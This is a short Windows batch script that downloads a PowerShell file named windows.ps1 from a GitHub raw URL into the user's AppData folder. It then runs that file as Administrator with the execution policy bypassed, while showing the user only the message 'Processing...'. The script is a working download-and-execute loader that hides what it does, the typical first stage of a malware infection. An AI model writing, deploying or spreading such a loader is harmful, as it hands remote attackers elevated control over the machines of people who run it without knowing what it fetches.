@echo off
set "URL=https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/windows.ps1"
set "DEST=%AppData%\windows.ps1"

echo Processing...

:: Use PowerShell to download with TLS 1.2 enabled and bypass policy
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"

:: Run the downloaded PS1 as Administrator with Bypass enabled
powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%DEST%""'"

exit
